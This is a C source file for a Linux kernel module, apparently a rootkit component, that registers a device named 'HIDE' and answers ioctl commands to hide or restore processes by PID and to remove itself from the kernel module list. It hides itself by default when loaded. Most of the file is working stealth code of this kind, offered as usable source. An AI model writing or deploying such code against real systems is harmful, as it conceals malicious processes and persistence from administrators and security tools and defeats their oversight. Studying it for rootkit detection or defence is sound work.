#include <linux/module.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/tty.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>  
#include "comm.h"
#include "hide_pid.h"

#define DEVICE_NAME "HIDE"

// 会导致还原模块报错，暂时禁用 kobject 相关
#define DISABLE_KOBJ 0

static int module_hidden = 0;
static struct list_head *module_previous;
#if DISABLE_KOBJ
static struct list_head *module_kobj_previous;
#endif

//隐藏模块
void module_hide(void)
{
	if (module_hidden == 1) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
#if DISABLE_KOBJ
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
#endif
	module_hidden = 1;
}

// 恢复显示
void module_show(void)
{
	if (module_hidden == 0) return;
	list_add(&THIS_MODULE->list, module_previous);
#if DISABLE_KOBJ
	int status;
	status = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
	printk(KERN_INFO "kobject_add: %d", status);
	list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
#endif
	module_hidden = 0;
}

int dispatch_open(struct inode *node, struct file *file)
{
	return 0;
}

int dispatch_close(struct inode *node, struct file *file)
{
	return 0;
}

long dispatch_ioctl(struct file *const file, unsigned int const cmd, unsigned long const arg)
{
	switch (cmd)
	{
	case OP_HIDE_PID: 
	{
		hide_process((pid_t)arg);
		break;
	}
	case OP_RED_PID: 
	{
		restore_process((pid_t)arg);
		break;
	}
	case OP_HIDE_MOD:
	{
		module_hide();
		break;
	}
	case OP_RED_MOD:
	{
		module_show();
		break;
	}
	default:
		break;
	}
	return 0;
}

struct file_operations dispatch_functions = {
	.owner = THIS_MODULE,
	.open = dispatch_open,
	.release = dispatch_close,
	.unlocked_ioctl = dispatch_ioctl,
};

struct miscdevice misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = DEVICE_NAME,
	.fops = &dispatch_functions,
};

int __init module_entry(void)
{
	int ret;
	ret = misc_register(&misc);
	printk(KERN_INFO "module_entry\n");
	// 默认隐藏模块
	module_hide();
	return ret;
}

void __exit exit_module(void)
{
	printk(KERN_INFO "exit_module\n");
	// 卸载模块前清理
	hide_exit();
	misc_deregister(&misc);
}

module_init(module_entry);
module_exit(exit_module);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HYLAB");
